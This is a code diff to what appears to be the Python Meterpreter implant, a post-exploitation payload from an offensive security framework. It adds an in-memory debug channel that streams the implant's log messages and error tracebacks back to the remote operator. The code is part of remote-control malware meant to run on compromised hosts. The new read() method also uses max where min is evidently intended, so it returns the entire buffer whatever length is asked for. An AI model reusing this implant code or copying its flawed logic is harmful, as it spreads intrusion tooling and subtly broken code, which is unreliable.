@@ -206,6 +206,25 @@ class MeterpreterFile(object):
 export(MeterpreterFile)
 
 #@export
+class MeterpreterFileMemory(MeterpreterFile):
+	def __init__(self):
+		self.data = bytes()
+
+	def read(self, length):
+		length = max(length, len(self.data))
+		piece = self.data[:length]
+		self.data = self.data[length:]
+		return piece
+
+	def write(self, data):
+		if not is_bytes(data):
+			data = bytes(data, 'UTF-8')
+		self.data += data
+
+	def close(self):
+		self.data = bytes()
+
+#@export
 class MeterpreterSocket(object):
 	def __init__(self, sock):
 		self.sock = sock
@@ -290,9 +309,16 @@ class PythonMeterpreter(object):
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
-		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
+		for func in list(filter(lambda x: x.startswith('_core') or x.startswith('_channel_open_core_'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
 		self.running = True
+		self.debug_channel = None
+
+	def debug_print(self, msg):
+		if self.debug_channel:
+			self.debug_channel.write(msg + '\n')
+		if DEBUGGING:
+			print(msg)
 
 	def register_function(self, func):
 		self.extension_functions[func.__name__] = func
@@ -392,6 +418,21 @@ class PythonMeterpreter(object):
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
 		self.socket.send(pkt)
 
+	def _channel_open_core_debug(self, request, response):
+		if self.debug_channel:
+			for channel_id, channel in self.channels.items():
+				if channel == self.debug_channel:
+					break
+			if channel != self.debug_channel:
+				self.debug_channel.close()
+				self.debug_channel = MeterpreterFileMemory()
+				channel_id = self.add_channel(self.debug_channel)
+		else:
+			self.debug_channel = MeterpreterFileMemory()
+			channel_id = self.add_channel(self.debug_channel)
+		response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+		return ERROR_SUCCESS, response
+
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
@@ -413,8 +454,9 @@ class PythonMeterpreter(object):
 		return ERROR_SUCCESS, response
 
 	def _core_channel_open(self, request, response):
-		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
-		handler = 'channel_open_' + channel_type['value']
+		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)['value']
+		self.debug_print('[*] opening channel: ' + channel_type)
+		handler = 'channel_open_' + channel_type
 		if handler not in self.extension_functions:
 			return ERROR_FAILURE, response
 		handler = self.extension_functions[handler]
@@ -429,6 +471,8 @@ class PythonMeterpreter(object):
 			channel.kill()
 		elif isinstance(channel, MeterpreterFile):
 			channel.close()
+			if channel == self.debug_channel:
+				self.debug_channel = None
 		elif isinstance(channel, MeterpreterSocket):
 			channel.close()
 		else:
@@ -444,7 +488,9 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
 		result = False
-		if isinstance(channel, MeterpreterFile):
+		if isinstance(channel, MeterpreterFileMemory):
+			result = len(channel.data) == 0
+		elif isinstance(channel, MeterpreterFile) and hasattr(channel, 'fileno'):
 			result = channel.tell() >= os.fstat(channel.fileno()).st_size
 		response += tlv_pack(TLV_TYPE_BOOL, result)
 		return ERROR_SUCCESS, response
@@ -524,17 +570,16 @@ class PythonMeterpreter(object):
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
 			try:
-				if DEBUGGING:
-					print('[*] running method ' + handler_name)
+				self.debug_print('[*] running method ' + handler_name)
 				result, resp = handler(request, resp)
 			except Exception:
-				if DEBUGGING:
-					print('[-] method ' + handler_name + ' resulted in an error')
-					traceback.print_exc(file=sys.stderr)
+				self.debug_print('[-] method ' + handler_name + ' resulted in an error')
+				traceback.print_exc(file=sys.stderr)
+				if self.debug_channel:
+					traceback.print_exc(file=self.debug_channel)
 				result = ERROR_FAILURE
 		else:
-			if DEBUGGING:
-				print('[-] method ' + handler_name + ' was requested but does not exist')
+			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
 			result = ERROR_FAILURE
 		resp += tlv_pack(TLV_TYPE_RESULT, result)
 		resp = struct.pack('>I', len(resp) + 4) + resp
